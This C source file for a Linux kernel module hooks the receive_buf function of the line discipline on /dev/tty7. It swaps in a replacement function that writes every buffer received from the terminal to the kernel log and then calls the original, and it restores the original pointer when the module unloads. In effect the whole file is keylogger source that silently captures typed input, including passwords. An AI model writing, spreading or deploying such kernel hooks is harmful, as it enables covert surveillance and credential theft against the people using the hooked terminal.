#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <linux/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/tty.h>
#include <linux/fs.h>
#include "headers/kfile.h" // file operations

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// pointer to the old receive_buf function
void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
			char*,int);
void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
		     char* fp, int count){
  printk(KERN_ALERT "buffer is %s\n",cp);
  // call the old function
  old_receive_buf(tty,cp,fp,count);
}
static int init(void) {
  // our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  char* dev_name = "/dev/tty7";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  if(file){
    printk(KERN_ALERT "tty was opened\n");
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      printk(KERN_ALERT "this is a valid tty\n");
      if(tty->ldisc->ops->receive_buf){
	//printk(KERN_ALERT "has receive_buf\n");
	//change the old receive_buf
	old_receive_buf = tty->ldisc->ops->receive_buf;
	tty->ldisc->ops->receive_buf = new_receive_buf;
      }
    }
  }
  kclose(file);
  return 0;
}
	 
static void exit(void) {
// our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  char* dev_name = "/dev/tty7";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  if(file){
    printk(KERN_ALERT "tty was opened\n");
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      printk(KERN_ALERT "this is a valid tty\n");
      if(tty->ldisc->ops->receive_buf){
	//printk(KERN_ALERT "has receive_buf\n");
	//change the old receive_buf
	//old_receive_buf = tty->ldisc->ops->receive_buf;
	tty->ldisc->ops->receive_buf = old_receive_buf;
      }
    }
  }
  kclose(file);
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
